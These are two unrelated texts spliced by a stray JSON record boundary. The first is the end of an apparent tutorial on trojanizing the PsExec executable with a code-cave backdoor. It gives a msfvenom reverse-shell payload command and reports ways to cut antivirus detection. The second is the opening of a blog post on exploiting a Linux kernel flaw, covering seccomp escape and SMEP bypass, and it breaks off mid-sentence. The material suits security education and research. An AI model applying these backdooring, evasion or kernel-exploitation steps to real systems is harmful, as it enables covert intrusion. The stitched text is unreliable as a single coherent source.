ImageBase, EntryPoint,\nChecksum and many other fields.\n\fPage | 6\nNext, click on Sections:\nAs NumberOfSections shows, we have 5 sections.\nThe .text section contains the executable code, so by default it needs to be readable and executable.\n.data and .rdata contains read-only data, executing content inside this section is possible by setting the Executable\nflag.\n.rsrc contains resource data, .reloc section is usually not needed unless there are base address conflicts in\nmemory.\nNow, onto more definitions:\n\u2022 Voffset: Offset of the section from the ImageBase when loaded into memory.\n\u2022 VSize: Size of the section when loaded into memory.\n\u2022 ROffset: Real file offset on disk, this can be verified using your preferred HEX editor tool.\n\u2022 RSize: Real size of the section on disk.\n\u2022 Flags: Contains flags defining \"permissions\" on sections. For easy viewability, right click a section - > Edit\nSectionHeader then the small box next to Flags text field.\n\fPage | 7\nCode Caves\nAn excellent article about code caves written by Drew Benton defined code caves as \"a redirection of program\nexecution to another location and then returning back to the area where program execution had previously left.\"\nIn context of backdooring, a code cave is a new or unused dead space where we can put custom code and\nredirect the execution to it, without breaking the actual executable.\nCouple of techniques we'll review:\n\u2022 Adding a new section\nPros: Lots of space.\nCons: Binary size increases, more susceptible to get flagged as malicious.\n\u2022 Using existing dead space\nPros: File size doesn't change, less susceptible to get flagged as malicious.\nCons: Might be very low on space, section permissions might need to change to allow code execution.\nThere are 2 more techniques which this paper doesn't cover:\n\u2022 Extending last section\nPros: Number of sections doesn't change.\nCons: Binary size increases, more susceptible to get flagged as malicious, heavy dependency on the\nlast section. Doesn't perform better than adding a new section.\n\u2022 Cave jumping\nPros: Flexible, can utilize a single or a mix of existing techniques. Possibly stealthier.\nCons: Tricky to break payload into smaller parts, might require changing permissions on multiple\nsections.\n\fPage | 8\nAddress Space Layout Randomization (ASLR)\nASLR is a security feature that randomises the base address of executables\/DLLs and positions of other memory\nsegments like stack and heap. This prevents exploits from reliably jumping to a certain function\/piece of code.\nWhen a PE\/DLL is compiled with \/DYNAMICBASE on an OS with ASLR support, the .reloc segment (remember?) is\nno longer needed. When patching instructions we can't use fixed jumps, instead we have to make use of relative\noffsets between current instruction and next instruction to jump to (will be explained in details later).\nIf you want to see ASLR in action, load PsExec in Immunity and go to the Memory tab (ALT+M):\nBase Address is 0113 0000. Restart it again (you need to close Immunity):\nBase Address became 0016 0000. That's all you need to know about ASLR for now.\n\fPage | 9\nFile Offsets and RVA\nAs discussed earlier, when a PE is loaded into memory, it's not mapped exactly the same way it's on disk, which\nintroduces a few terms we need to keep in mind for later usage.\n\u2022 File Offset: Current position in file which is the same when examined with a HEX editor.\n\u2022 Base Address: Starting address of the binary when loaded into memory. Preferred value by default is\n0x00400000 but with ASLR enabled, this value changes on every load.\n\u2022 Virtual Address: Address of the segment when loaded into memory, that includes the base address the\nbinary starts at.\n\u2022 Relative Virtual Address: Same as the virtual address with the base address subtracted.\nEntryPoint is at 9DE6, yet this value is the RVA, so when mapped into memory it will be at \ud835\udc3c\ud835\udc5a\ud835\udc4e\ud835\udc54\ud835\udc52\ud835\udc35\ud835\udc4e\ud835\udc60\ud835\udc52 +\n\ud835\udc38\ud835\udc5b\ud835\udc61\ud835\udc5f\ud835\udc66\ud835\udc43\ud835\udc5c\ud835\udc56\ud835\udc5b\ud835\udc61. Again, ImageBase value shown is a preferred one, if that location is occupied the PE loader will find\nanother location. If ASLR is enabled, this value is ignored completely.\nLoad PsExec into Immunity, you should see the following:\nNext go to the Memory Window (ALT+M):\nWhen the binary is loaded into memory, sections are mapped differently than on file, if you look at the Size\ncolumn, all sizes are multiples of 4096 (remember SectionAlignment?)\nBaseAddress is 0x00F0000, can be found either by checking the start address of the PE header or value in Owner\ncolumn.\nOne more observation is the SizeOfHeaders field, which is 400h bytes, yet it's mapped into 1000h bytes, so there's\na 600h bytes offset between FileOffset of .text and its RVA equivalent. Equation 2 in Appendix allows you to\ncalculate this.\n\fPage | 10\nChapter 2: Manual Backdooring\nManipulating Execution Flow\nThe following steps will demonstrate how a basic backdoor implementation should look:\n1. Hijacking code execution: Easiest way to execute the backdoor is replacing the instruction at\nModuleEntryPoint with JMP Cave. JMP Cave will possibly overwrite more than a single instruction, so save\nthem for later as well as the address of the instruction following it.\n2. Storing current state: As executing the binary is crucial to hide the backdoor, we need to store the values in\nall registers\/flags. This is done by two instructions, PUSHAD and PUSHFD. Take note of ESP.\n3. Executing malicious payload: Now we can safely execute the shellcode.\n4. Aligning stack: Shellcode possibly pushes data onto the stack. As we need to retrieve the registers\/flags, ESP\nmight need to be aligned. Compare its value with ESP after step 3 and align it (ADD ESP, alignment).\n5. Restoring state: As you'd expect, just call POPFD\/POPAD. Needs to be done in reverse order as stack is a\nLIFO structure.\n6. Execute overwritten instruction: We overwrote some instructions at Step 1, time to rewrite them.\n7. Continue execution: Last step is jumping to the next instruction to be executed to continue with the normal\nflow of the binary.\nBefore Backdooring\n+------------------------------------------+\n| .text Section Start |\n| |\n| |\n| |\n|- - - - - - - - - - - - - - - - - - - - - |\n| Some Instruction |\n|- - - - - - - - - - - - - - - - - - - - - |\n| |\n| |\n| .text Section Ends |\n+------------------------------------------+\n| |\n| |\n| |\n| |\n| |\n| Other Sections (.data\/.reloc) |\n| |\n| |\n| |\n| |\n+------------------------------------------+\n\fPage | 11\nAfter Backdooring\n+------------------------------------------+\n| .text Section Start |\n| |\n| |\n| |\n|- - - - - - - - - - - - - - - - - - - - - |\n| Instruction replaced with JMP Cave |\n|- - - - - - - - - - - - - - - - - - - - - |\n| Instruction to execute After Cave |\n|- - - - - - - - - - - - - - - - - - - - - |\n| |\n| .text Section Ends |\n+------------------------------------------+\n| |\n| |\n| |\n| |\n| |\n| Other Sections (.data\/.reloc) |\n| |\n| |\n| |\n| |\n+------------------------------------------+\n| Code Cave |\n| PUSHAD\/PUSHFD |\n| |\n| [Shellcode] |\n| |\n| Align Stack |\n| Overwritten Entry Point Instruction |\n| JMP Next Instruction |\n+------------------------------------------+\n\fPage | 12\nClassic Backdooring\nFirst technique is adding a whole new section at the end of the original PE, a regular Meterpreter payload is ~350\nbytes, let's create a new section to fit that using Stud_PE.\nNOTE: Reason I'm using Stud_PE instead of LordPE + a hex editor is that it sometimes failed me, feel free to use\nwhatever you're comfortable with.\nOpen Stud_PE, drag PsExec.exe into it, go to Sections tab, right click -> New Section and fill in the fields as the\nfollowing:\nAfter it's added, you should see this:\nFlags make the section by default RWX, as the section should be readable and executable, writable flag should be\nset if changes are made to the section when in memory.\n\fPage | 13\nGood, section exists, double click it and you should get a dump full of nulls.\nThis is where our payload will reside. Before we go on let's check how suspicious this file already is. For that we'll\nuse a website called VirusTotal.com to scan the file against popular AV vendors. Although it distributes the results,\nNoDistribute.com seemed to malfunction and reported it to be clean (0\/35). Also, I don\u2019t mind sharing the file, so\nnot much to lose.\n\fPage | 14\nNOTE: PsExec gets flagged by default with Sophos anti-virus, so it will be ignored.\nJust having an extra section made 3\/59 AVs suspicious. Let's move on for now.\nNext step is to hijack the first instruction by jumping to our new section, for that we need the RVA for both the\n.test section, first CALL instruction and address of the next instruction.\n001C9DE6 > $ E8 15770000 CALL PsExec_b.001D1500\n001C9DEB .^E9 7BFEFFFF JMP PsExec_b.001C9C6B\nRVA of 001D1500 is RVA_11500. RVA of 001C9DEB is RVA_9DEB, RVA of .test is RVA_7D0000.\nNOTE: If JMP CAVE overwrites more than a single command, you need to handle that too. Luckily for us, CALL\nPsExec_b.001D1500 opcode size matches JMP CAVE.\nWe'll use nasm_shell.rb (part of Metasploit project) to get the correct instruction. If you assemble a JMP\n.test_section_start it might work once, but the address jumped to will be hard coded and won't work on reload.\nTo jump from 9DE6 to 7 D000, offset is 7 321A.\nCopy the generated opcode (E915320700) then go back to Immunity. Right click the first instruction -> Binary ->\nBinary Paste.\nStep a single instruction (F7), you should land on the very start of .test section.\nSweet, restart debugging (CTRL+F2), paste the new opcode and right click -> Copy To Executable -> All\nModification. On the new window, right click -> Save File. I'll name it PsExec_bkdr1.exe.\nOpen the new executable and you should see the newly overwritten command (You think it changed? Take a\ncloser look). Next, step to the new section and let's add some code.\n\fPage | 15\n1. PUSHFD\/PUSHAD to store values in registers\/flags.\n2. ~400 NOPs (This is where the shellcode will reside along with stack alignment).\n3. POPAD\/POPFD\n4. Overwritten instruction(s) (Hijacked ModuleEntryPoint)\n5. JMP to next instruction\nAt the very end, you should restore the registers\/flags.\nMemory should look like this:\nRVA_7D000 - RVA_7D001: PUSHAD\/PUSHFD\nRVA_7D002 - RVA_7D1FD: NOPs (space for shellcode and stack alignment).\nRVA_7D1FE - RVA_7D1FF: POPFD\/POPAD (Stack is LIFO).\nStarting 011D D200 (RVA_7D200), we want to add the following couple of instructions:\n\u2022 CALL RVA_11500\n\u2022 JMP RVA_9DEB\nWe need to CALL RVA_11500, pretty easy with nasm_shell:\nCopy the opcode and make sure you select enough space for the new instruction.\n\fPage | 16\nSame thing to jump from RVA_7D205 to RVA_9DEB:\nFinal changes should look similar to this:\nSave the changes to PsExec_bkdr2.exe. Executable should work exactly as original as the code cave handles\nproper execution of the binary. Another quick scan shows 9\/66 detection rate. Note that the executable doesn't\ncontain any malicious payload yet.\nLet's generate our payload using msfvenom, we'll use the windows\/shell_reverse_tcp payload.\nImportant notes:\n\u2022 Default EXITFUNC is process, which will simply exit the process after closing the shell, we do not want that.\nEXITFUNC=none is used as execution won't be paused.\n\u2022 Generated payload needs to be modified as it calls WaitForSingleObject with value -1 (wait indefinitely). We\ndon't want that either.\n\fPage | 17\nSelect enough space after the PUSHAD\/PUSHFD commands and paste the generated payload. Near the end of the\npayload patch these commands to avoid pausing the program execution [WaitForSingleObject(-1)]:\nMake sure you align the stack by taking note of ESP after the PUSHFD\/PUSHAD and ESP after executing the\npayload. In my case I had to add an instruction ADD ESP, 1FC. Save all changes to avoid frustration.\nStart a netcat listener on your Windows machine and execute the binary. You should get a shell.\n\fPage | 18\nSuccess! Detection rate hit 17\/60 though.\nReducing detection rate requires a lot of trial and error, I attempted the following:\n\u2022 Encoding the payload with MSF (we used the raw payload earlier): BAD! Decoding stub by MSF is known by\nmost AVs.\n\u2022 Fixing the checksum: Eh, most AVs just ignore it.\n\u2022 Compressing the binary (used UPX): GOOD! Detection dropped to 11\/60.\nWe're getting there. Let's come up with a slightly different technique.\n\fPage | 19\nChapter 3: Hijacking Existing Code Caves\nPrevious approach had some drawbacks: 1) File size changed significantly, 2) it got flagged by 3 AVs as malicious,\nwhen a simple logic was added (still no actual payload generated), it went up to 9. Let's try to resolve this\nproblem by using already existing empty caves in our binary.\nNote that searching for code caves has to be done on the file itself, not when it\u2019s loaded into memory.\nFor that we'll use the following command:\nroot@kali:~\/Desktop# backdoor-factory -f PsExec.exe -c -l 500 -q\n\u2022 -f: Input file.\n\u2022 -c: Search for code caves.\n\u2022 -l: Minimum size of code cave.\n\u2022 -q: Quiet mode.\n\fPage | 20\nWoah, wtf am I looking at?\n\u2022 BDFactory found at least 3 code caves where we back implement our backdoor in.\n\u2022 All 3 caves lie in the .data segment.\n\u2022 Begin\/End of Cave are both raw file offsets, to make use of them we\u2019ll get their equivalent RVA.\n\u2022 PointerToRawData\/End of Raw Data: Raw file offsets noting the start\/end of the .data segment.\nLet's use the first cave, since it's located in the .data region we need to set the executable flag for the .data region\n(using LordPE). Just setting the X flag to .data flagged it as malicious by 2\/60 AVs.\nNext, we need to get the RVA of Cave 1 offsets using Equation 3:\n\ud835\udc45\ud835\udc49\ud835\udc34 = \ud835\udc49\ud835\udc42\ud835\udc53\ud835\udc53\ud835\udc60\ud835\udc52\ud835\udc61 \ud835\udc5c\ud835\udc53 \ud835\udc36\ud835\udc4e\ud835\udc63\ud835\udc52\u2032\n\ud835\udc60 \ud835\udc46\ud835\udc52\ud835\udc50\ud835\udc61\ud835\udc56\ud835\udc5c\ud835\udc5b + \ud835\udc45\ud835\udc42\ud835\udc53\ud835\udc53\ud835\udc60\ud835\udc52\ud835\udc61 \ud835\udc5c\ud835\udc53 \ud835\udc36\ud835\udc4e\ud835\udc63\ud835\udc52 \u2212 \ud835\udc45\ud835\udc42\ud835\udc53\ud835\udc53\ud835\udc60\ud835\udc52\ud835\udc61 \ud835\udc5c\ud835\udc53 \ud835\udc36\ud835\udc4e\ud835\udc63\ud835\udc52\u2032\n\ud835\udc60 \ud835\udc46\ud835\udc52\ud835\udc50\ud835\udc61\ud835\udc56\ud835\udc5c\ud835\udc5b \u2212 \ud835\udc36\ud835\udc62\ud835\udc5f\ud835\udc5f\ud835\udc52\ud835\udc5b\ud835\udc61 \ud835\udc34\ud835\udc51\ud835\udc51\ud835\udc5f\ud835\udc52\ud835\udc60\ud835\udc60\n= 0\ud835\udc6529000 + 0\ud835\udc65272\ud835\udc525 \u2212 0\ud835\udc6527200 = \ud835\udc45\ud835\udc49\ud835\udc34_290\ud835\udc385\nLet's make it RVA_290E8 just in case.\nReplace first instruction with payload:\nSave Change to PsExec2_bkdr.exe then reload it and step.\n\fPage | 21\nAwesome, now we do the same thing, add the PUSHFD\/POPFD, ~400 NOPs, POPFD\/POPAD, CALL RVA_11500 and\nJMP RVA_9DEB.\nAnother scan with the latest changes showed 5\/58 detection rate, that's 4 less than last scan at same stage!\nNext, we'll do the same thing with pasting the MSF payload and adjusting the stack. After saving the changes, let's\nscan it again.\n\fPage | 22\nAlthough 13\/60 is not so good, it's still an improvement over 17\/60 thanks to not using a new section. Notice that\nwe didn't encode, encrypt, or obfuscate the MSF payload in any way.\n\fPage | 23\nChapter 4: The Human Factor\nSo we got rid of the extra section, what else can we do? One thing that we did so far in both examples is placing\nthe JMP Cave at entry point. That\u2019s good, it\u2019s a guaranteed way to execute the payload, but that also allows AVs\nto step through it, which increases the detection rate significantly.\nWhat if we make it trigger on human interaction? AVs aren\u2019t sophisticated enough (maybe never?) to pass\narguments or interact too much with executables. And after all, PsExec expects parameters, otherwise it prints\nthe manual.\nLet's observe how PsExec behaves using a regular command:\nWhat if the backdoor is hooked on printing that specific string? We can put a breakpoint when that string gets\nloaded to memory and make that our backdoor trigger.\n\fPage | 24\nImmunity allows providing command line arguments.\nSearch for -> All referenced text strings.\nRight click -> Follow in Disassembly.\nYou might face an exception, you can safely ignore it. Let's step into the second CALL (CALL PsExec2_.003182AF).\nBefore RET there's some unused space, why don't we make this JMP to our payload instead?\nAt RVA_8334 let's jump to our code cave (RVA_290E8). What's awesome about hijacking the RETN instruction?\nWe can directly use it and not care about the next command.\n\fPage | 25\nNOTE: Don't forget to patch the EntryPoint instruction, we no longer need to jump to the cave at that position.\nSave changes and start the listener.\nHow about AV?\nLowest detection rate so far, hit 9\/60! Possibly because of static analysis and MSF is well known by any decent AV.\n\fPage | 26\nMore Anti-Virus Bypassing Shenanigans\nAs with the previous section, let's think of ways to reduce detection; I tried the following:\n1. Stripping the binary with strip: No change (9\/60).\n2. Stripping the broken certificate: BAD! Went up to 18\/60.\n3. Smallest MSF payload XORed with custom XOR stub (https:\/\/github.com\/abatchy17\/SLAE)\nPayload used: msfvenom -p windows\/shell_reverse_tcp -b \"\\x00\" --smallest\nDetection rate: Lowest yet, hitting 5\/60!\nWhat if we get rid of the MSF payload and use a less suspicious shell off exploit-db? I used this:\nhttps:\/\/www.exploit-db.com\/exploits\/40352\/, same structure with no encoding.\nOh, look at that! Reaching 3\/59 detection rate! There's possibly room for improvement (with encryption maybe?)\nbut that's enough for now.\n\fPage | 27\nHow do I protect myself?\nCompile from source, write your own tools and trust no one. Or just give up.\nBut on a serious note:\n\u2022 Download binaries only from trusted sources.\n\u2022 Validate checksums\/hashes.\n\u2022 Patch your OS and update the AV database regularly.\n\u2022 Look for signs, do you expect calc.exe to request firewall bypass?\n\u2022 Cross fingers and double click more than once.\nThanks for reading!\n\fPage | 28\nAppendix\nEquations\n1. \ud835\udc40\ud835\udc5c\ud835\udc51\ud835\udc62\ud835\udc59\ud835\udc52\ud835\udc38\ud835\udc5b\ud835\udc61\ud835\udc5f\ud835\udc66\ud835\udc43\ud835\udc5c\ud835\udc56\ud835\udc5b\ud835\udc61 = \ud835\udc35\ud835\udc4e\ud835\udc60\ud835\udc52\ud835\udc34\ud835\udc51\ud835\udc51\ud835\udc5f\ud835\udc52\ud835\udc60\ud835\udc60 + \ud835\udc38\ud835\udc5b\ud835\udc61\ud835\udc5f\ud835\udc66\ud835\udc43\ud835\udc5c\ud835\udc56\ud835\udc5b\ud835\udc61\n2. \ud835\udc39\ud835\udc56\ud835\udc59\ud835\udc52 \ud835\udc42\ud835\udc53\ud835\udc53\ud835\udc60\ud835\udc52\ud835\udc61 \ud835\udc5c\ud835\udc53 \ud835\udc38\ud835\udc5b\ud835\udc61\ud835\udc5f\ud835\udc66\ud835\udc43\ud835\udc5c\ud835\udc56\ud835\udc5b\ud835\udc61 = \ud835\udc38\ud835\udc5b\ud835\udc61\ud835\udc5f\ud835\udc66\ud835\udc43\ud835\udc5c\ud835\udc56\ud835\udc5b\ud835\udc61 \u2212 (\ud835\udc49\ud835\udc56\ud835\udc5f\ud835\udc61\ud835\udc62\ud835\udc4e\ud835\udc59\ud835\udc46\ud835\udc56\ud835\udc67\ud835\udc52\ud835\udc42\ud835\udc53\ud835\udc3b\ud835\udc52\ud835\udc4e\ud835\udc51\ud835\udc52\ud835\udc5f \u2212 \ud835\udc46\ud835\udc56\ud835\udc67\ud835\udc52\ud835\udc42\ud835\udc53\ud835\udc3b\ud835\udc52\ud835\udc4e\ud835\udc51\ud835\udc52\ud835\udc5f\ud835\udc60)\n3. \ud835\udc45\ud835\udc49\ud835\udc34 \ud835\udc5c\ud835\udc53 \ud835\udc36\ud835\udc5c\ud835\udc51\ud835\udc52 \ud835\udc36\ud835\udc4e\ud835\udc63\ud835\udc52: \ud835\udc49\ud835\udc56\ud835\udc5f\ud835\udc61\ud835\udc62\ud835\udc4e\ud835\udc59 \ud835\udc42\ud835\udc53\ud835\udc53\ud835\udc60\ud835\udc52\ud835\udc61 \ud835\udc5c\ud835\udc53 \ud835\udc36\ud835\udc4e\ud835\udc63\ud835\udc52\u2032\n\ud835\udc60 \ud835\udc46\ud835\udc52\ud835\udc50\ud835\udc61\ud835\udc56\ud835\udc5c\ud835\udc5b + \ud835\udc45\ud835\udc4e\ud835\udc64 \ud835\udc42\ud835\udc53\ud835\udc53\ud835\udc60\ud835\udc52\ud835\udc61 \ud835\udc5c\ud835\udc53 \ud835\udc36\ud835\udc4e\ud835\udc63\ud835\udc52 \u2212 \ud835\udc45\ud835\udc4e\ud835\udc64 \ud835\udc42\ud835\udc53\ud835\udc53\ud835\udc60\ud835\udc52\ud835\udc61 \ud835\udc5c\ud835\udc53 \ud835\udc36\ud835\udc4e\ud835\udc63\ud835\udc52\u2032\ud835\udc60 \ud835\udc46\ud835\udc52\ud835\udc50\ud835\udc61\ud835\udc56o\ud835\udc5b\nRepositories\n1. https:\/\/github.com\/abatchy17\/Introduction-To-Backdooring\n2. https:\/\/github.com\/abatchy17\/SLAE\n\fPage | 29\nAcknowledgements\nThanks to @jack, @sae, @vcsec and @wetw0rk at NetSecFocus for taking the time to review this crap.\nTo my wife for believing in me. And for thinking I\u2019m funny.\n\fPage | 30\nReferences\n[1] https:\/\/en.wikibooks.org\/wiki\/X86_Disassembly\/Windows_Executable_Files\n[2] https:\/\/sector876.blogspot.com\/2013\/03\/backdooring-pe-files-part-1.html\n[3] https:\/\/pentest.blog\/art-of-anti-detection-2-pe-backdoor-manufacturing\/\n[4] https:\/\/github.com\/secretsquirrel\/the-backdoor-factory\n[5] http:\/\/blog.sevagas.com\/IMG\/pdf\/BypassAVDynamics.pdf\n[6] https:\/\/www.codeproject.com\/Articles\/20240\/The-Beginners-Guide-to-Codecaves\n\f"}
{"text":"#[1]Lexfo's security blog Full Atom Feed [2]Lexfo's security blog Full\nRSS Feed [3]Lexfo's security blog Categories Atom Feed [4]Lexfo's\nsecurity blog Categories RSS Feed\n[5]Lexfo's security blog\n(BUTTON)\n* [6]Back to the main site\n* [7]Home\n* [8]Categories\n* [9]Tags\n* [10]Archives\nCVE-2017-11176: A step-by-step Linux Kernel exploitation (part 4\/4)\nTue 02 October 2018 by Nicolas FABRETTI in [11]Vulnerability.\n[12]Linux [13]Exploit [14]Vulnerability [15]Kernel [16]Step-by-step\n[17]Tweet\n[18]Share\n[19]Share\n[20]Share\nIntroduction\nIn this final part, we will transform the arbitrary call primitive (cf.\n[21]part 3) into arbitrary code execution in ring-0, repair the kernel\nand get the root credentials. It will emphasize a lot on x86-64\narchitecture-specific stuff.\nFirst, the core concept section focuses on another critical kernel\nstructure (thread_info) and how it can be abused from an exploitation\npoint of view (retrieve current, escape seccomp-based sandbox, gain\narbitrary read\/write). Next, we will see the virtual memory layout, the\nkernel thread stacks and how they are linked to the thread_info. Then\nwe will see how linux implements the hash tables used by Netlink. This\nwill help for kernel repair.\nSecondly, we will try to call a userland payload directly and see how\nwe get blocked by a hardware protection mechanism (SMEP). We will do an\nextensive study of a page fault exception trace to get meaningful\ninformation and see various ways to defeat SMEP.\nThirdly, we will extract gadgets from a kernel image and explain why we\nneed to restrict the research to the .text section. With such gadgets,\nwe will do a stack pivot and see how to deal with aliasing. With\nrelaxed constraints on gadget, we will implement the ROP-chain that\ndisables SMEP, restore the stack pointer and stack frame as well as\njumping to userland code in a clean state.\nFourth, we will do kernel reparation. While repairing the socket\ndangling pointer is pretty straightforward, repairing the netlink hash\nlist is a bit more complex. Since the bucket lists are not circular and\nwe lost track of some elements during the reallocation, we will use a\ntrick and an information leak to repair them.\nFinally, we will do a short study about the exploit reliability (where\nit can fail) and build a danger map during various stages of the\nexploit. Then, we will see how to gain root rights.\n__________________________________________________________________\nTable of Contents\n* [22]Core Concepts #4\n* [23]Meeting Supervisor Mode Execution Prevention\n* [24]Defeating SMEP Strategies\n* [25]Finding Gadgets\n* [26]Stack Pivoting\n* [27]Debugging the kernel with GDB\n* [28]The ROP-Chain\n* [29]Repair the Kernel\n* [30]Reliability\n* [31]Getting root\n* [32]Conclusion\n* [33]Going Further\n__________________________________________________________________\nCore Concepts #4\nWARNING: A lot of concepts addressed here hold out-dated information\ndue to a major overhaul started in the mid-2016's. For instance, some\nthread_info's fields [34]have been moved into the thread_struct (i.e.\nembedded in task_struct). Still, understanding \"what it was\" can help\nyou understand \"what it is\" right now. And again, a lot of systems run\n\"old\" kernel versions (i.e. < 4.8.x).\nFirst, we have a look at the critical thread_info structure and how it\ncan be abused during an exploitation scenario (retrieving current,\nescaping seccomp, arbitrary read\/write).\nNext, we will see how the virtual memory map is organized in a x86-64\nenvironment. In particular, we will see why addressing translation is\nlimited to 48-bits (instead of 64) as well as what a \"canonical\"\naddress means.\nThen, we will focus on the kernel thread stack. Explaining where and\nwhen they are created as well as what they hold.\nFinally, we will focus on the netlink hash table data structure and the\nassociated algorithm. Understanding them will help during kernel repair\nand improve the exploit reliability.\nThe thread_info Structure\nJust like the struct task_struct, the struct thread_info structure is\nvery important that one must understand in order to exploit bugs in the\nLinux kernel.\nThis structure is architecture dependent. In the x86-64 case, the\ndefinition is:\n\/\/ [arch\/x86\/include\/asm\/thread_info.h]\nstruct thread_info {\nstruct task_struct    *task;\nstruct exec_domain    *exec_domain;\n__u32                 flags;\n__u32                 status;\n__u32                 cpu;\nint                   preempt_count;\nmm_segment_t          addr_limit;\nstruct restart_block  restart_block;\nvoid __user           *sysenter_return;\n#ifdef CONFIG_X86_32\nunsigned long         previous_esp;\n__u8                  supervisor_stack[0];\n#endif\nint                   uaccess_err;\n};\nThe most important fields being:\n* task: pointer to the task_struct linked to this thread_info (cf.\nnext section)\n* flags: holds flags such as _TIF_NEED_RESCHED or _TIF_SECCOMP (cf.\n[35]Escaping Seccomp-Based Sandbox)\n* addr_limit: the \"highest\" userland virtual address from kernel\npoint-of-view. Used in \"software protection mechanism\" (cf.\n[36]Gaining Arbitrary Read\/Write)\nLet's see how we can abuse each of those fields in an exploitation\nscenario.\nUsing Kernel Thread Stack Pointer\nIn general, if you've got access to a task_struct pointer, you can\nretrieve lots of other kernel structures by dereferencing pointers from\nit. For instance, we will use it in our case to find the address of the\nfile descriptor table during kernel reparation.\nSince the task field points to the associated task_struct, retrieving\ncurrent (remember Core Concept #1?) is a simple as:\n#define get_current() (current_thread_info()->task)\nThe problem is: how to get the address of the current thread_info?\nSuppose that you have a pointer in the kernel \"thread stack\", you can\nretrieve the current thread_info pointer with:\n#define THREAD_SIZE (PAGE_SIZE << 2)\n#define current_thread_info(ptr) (_ptr & ~(THREAD_SIZE - 1))\nstruct thread_info *ti = current_thread_info(leaky_stack_ptr);\nThe reason why this works is because the thread_info lives inside the\nkernel thread stack (see the \"Kernel Stacks\" section).\nOn the other hand, if you have a pointer to a task_struct, you can\nretrieve the current thread_info with the stack field in task_struct.\nThat is, if you have one of those pointers, you can retrieve each other\nstructures:\ntask_struct and _thread_info_ relationship task_thread_thread_info.png\nNote that the task_struct's stack field doesn't point to the top of the\n(kernel thread) stack but to the thread_info!\nEscaping Seccomp-Based Sandbox\nContainers as well as sandboxed applications seem to be more and more\nwidespread nowadays. Using a kernel exploit is sometimes the only way\n(or an easiest one) to actually escape them.\nThe Linux kernel's seccomp is a facility which allows programs to\nrestrict access to syscalls. The syscall can be either fully forbidden\n(invoking it is impossible) or partially forbidden (parameters are\nfiltered). It is setup using BPF rules (a \"program\" compiled in the\nkernel) called seccomp filters.\nOnce enabled, seccomp filters cannot be disabled by \"normal\" means. The\nAPI enforces it as there is no syscall for it.\nWhen a program using seccomp makes a system call, the kernel checks if\nthe thread_info's flags has one of the _TIF_WORK_SYSCALL_ENTRY flags\nset (TIF_SECCOMP is one of them). If so, it follows the\nsyscall_trace_enter() path. At the very beginning, the function\nsecure_computing() is called:\nlong syscall_trace_enter(struct pt_regs *regs)\n{\nlong ret = 0;\nif (test_thread_flag(TIF_SINGLESTEP))\nregs->flags |= X86_EFLAGS_TF;\n\/* do the secure computing check first *\/\nsecure_computing(regs->orig_ax);            \/\/ <----- \"rax\" holds the syscal\nl number\n\/\/ ...\n}\nstatic inline void secure_computing(int this_syscall)\n{\nif (unlikely(test_thread_flag(TIF_SECCOMP)))      \/\/ <----- check the flag a\ngain\n__secure_computing(this_syscall);\n}\nWe will not explain what is going on with seccomp past this point. Long\nstory short, if the syscall is forbidden, a SIGKILL signal will be\ndelivered to the faulty process.\nThe important thing is: clearing the TIF_SECCOMP flag of the current\nrunning thread (i.e. thread_info) is \"enough\" to disable seccomp\nchecks.\nWARNING: This is only true for the \"current\" thread, forking\/execve'ing\nfrom here will \"re-enable\" seccomp (see task_struct).\nGaining Arbitrary Read\/Write\nNow let's check the addr_limit field of thread_info.\nIf you look at various system call implementations, you will see that\nmost of them call copy_from_user() at the very beginning to make a copy\nfrom userland data into kernel-land. Failing to do so can lead to\ntime-of-check time-of-use (TOCTOU) bugs (e.g. change userland value\nafter it has been checked).\nIn the very same way, system call code must call copy_to_user() to copy\na result from kernelland into userland data.\nlong copy_from_user(void *to,   const void __user * from, unsigned long n);\nlong copy_to_user(void __user *to, const void *from, unsigned long n);\nNOTE: The __user macro does nothing, this is just a hint for kernel\ndevelopers that this data is a pointer to userland memory. In addition,\nsome tools like [37]sparse can benefit from it.\nBoth copy_from_user() and copy_to_user() are architecture dependent\nfunctions. On x86-64 architecture, they are implemented in\narch\/x86\/lib\/copy_user_64.S.\nNOTE: If you don't like reading assembly code, there is a generic\narchitecture that can be found in include\/asm-generic\/*. It can help\nyou to figure out what an architecture-dependent function is \"supposed\nto do\".\nThe generic (i.e. not x86-64) code for copy_from_user() looks like\nthis:\n\/\/ from [include\/asm-generic\/uaccess.h]\nstatic inline long copy_from_user(void *to,\nconst void __user * from, unsigned long n)\n{\nmight_sleep();\nif (access_ok(VERIFY_READ, from, n))\nreturn __copy_from_user(to, from, n);\nelse\nreturn n;\n}\nThe \"software\" access rights checks are performed in access_ok() while\n__copy_from_user() unconditionally copy n bytes from from to to. In\nother words, if you see a __copy_from_user() where parameters havn't\nbeen checked, there is a serious security vulnerability. Let's get back\nto the x86-64 architecture.\nPrior to executing the actual copy, the parameter marked with __user is\nchecked against the addr_limit value of the current thread_info. If the\nrange (from+n) is below addr_limit, the copy is performed, otherwise\ncopy_from_user() returns a non-null value indicating an error.\nThe addr_limit value is set and retrieved using the set_fs() and\nget_fs() macros respectively:\n#define get_fs()    (current_thread_info()->addr_limit)\n#define set_fs(x)   (current_thread_info()->addr_limit = (x))\nFor instance, when you do an execve() syscall, the kernel tries to find\na proper \"binary loader\". Assuming the binary is an ELF, the\nload_elf_binary() function is invoked and it ends by calling the\nstart_thread() function:\n\/\/ from [arch\/x86\/kernel\/process_64.c]\nvoid start_thread(struct pt_regs *regs, unsigned long new_ip, unsigned lon\ng new_sp)\n{\nloadsegment(fs, 0);\nloadsegment(es, 0);\nloadsegment(ds, 0);\nload_gs_index(0);\nregs->ip        = new_ip;\nregs->sp        = new_sp;\npercpu_write(old_rsp, new_sp);\nregs->cs        = __USER_CS;\nregs->ss        = __USER_DS;\nregs->flags     = 0x200;\nset_fs(USER_DS);                        \/\/ <-----\n\/*\n* Free the old FP and other extended state\n*\/\nfree_thread_xstate(current);\n}\nThe start_thread() function resets the current thread_info's addr_limit\nvalue to USER_DS which is defined here:\n#define MAKE_MM_SEG(s)  ((mm_segment_t) { (s) })\n#define TASK_SIZE_MAX   ((1UL << 47) - PAGE_SIZE)\n#define USER_DS     MAKE_MM_SEG(TASK_SIZE_MAX)\nThat is, a userland address is valid if it is below 0x7ffffffff000\n(used to be 0xc0000000 on 32-bits).\nAs you might already guessed, overwriting the addr_limit value leads to\narbitrary read\/write primitive. Ideally, we want something that does:\n#define KERNEL_DS   MAKE_MM_SEG(-1UL)   \/\/ <----- 0xffffffffffffffff\nset_fs(KERNEL_DS);\nIf we achieve to do this, we disable a software protection mechanism.\nAgain, this is \"software\" only! The hardware protections are still on,\naccessing kernel 